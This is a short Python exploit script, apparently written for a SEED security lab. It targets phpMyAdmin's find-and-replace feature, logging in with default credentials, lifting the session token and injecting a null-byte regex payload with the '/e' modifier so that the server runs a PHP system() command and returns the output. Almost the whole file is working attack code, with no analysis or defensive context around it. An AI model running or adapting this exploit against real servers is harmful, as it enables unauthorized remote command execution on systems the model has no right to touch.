######
# exploit.py : Use python3
######

# Initializing Imports
import requests
import re

# Specifying Constants. Use it to change according to your environment
username = 'root'
password = 'seedubuntu'
rootUrl = 'http://10.0.2.7/phpmyadmin'

# If created from the provided SQL file
db = 'vuln'
table = "vuln_table"

# The command to send to the computer
commandToSend = "system('whoami');"

# Get token for sending the query
s = requests.Session()
s.verify = False
response = s.post(rootUrl + "/?lang=en", dict(pma_username=username,pma_password=password))
if response.status_code is 200:
    token_place = response.text.find("token=") + 6
    token = response.text[token_place:token_place + 32]


# Send the payload 
response = s.post(rootUrl + "/tbl_find_replace.php", {"db": db,"table": table,"token": token,"find": "0/e\0","replaceWith": commandToSend,"columnIndex": "1","ajax_request": "true","useRegex": "on"}, cookies=requests.utils.dict_from_cookiejar(s.cookies))

# Output the result of the command
if response.status_code == 200:
    cleanregex = re.compile('<.*?>')
    cleantext = re.sub(cleanregex, '', response.json()["message"])
    print(cleantext)
